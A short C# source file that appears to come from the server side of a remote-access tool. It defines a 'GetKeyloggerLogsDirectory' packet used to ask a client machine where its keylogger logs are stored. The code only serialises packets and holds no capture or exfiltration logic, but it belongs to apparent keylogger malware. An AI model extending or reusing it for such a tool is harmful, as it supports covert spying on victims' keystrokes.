using Common.Networking;
using Common.Networking.Packets;
using Common.Utilities;

namespace Server.Networking.Packets.Keylogger
{
    public class GetKeyloggerLogsDirectory : DuplexPacket
    {
        public override int Id => 0x60;
        public string LogsDirectory { get; set; }

        public override void Populate(ProcessStream stream)
        {
            LogsDirectory = stream.ReadString();
        }

        public override void Serialize(ProcessStream stream)
        {
            using var packetStream = new ProcessStream();

            stream.Lock.Wait();
            stream.WriteInt(4 + (int)packetStream.Length);
            stream.WriteInt(Id);
            packetStream.Position = 0;
            packetStream.CopyTo(stream);
            stream.Lock.Release();
        }
    }
}
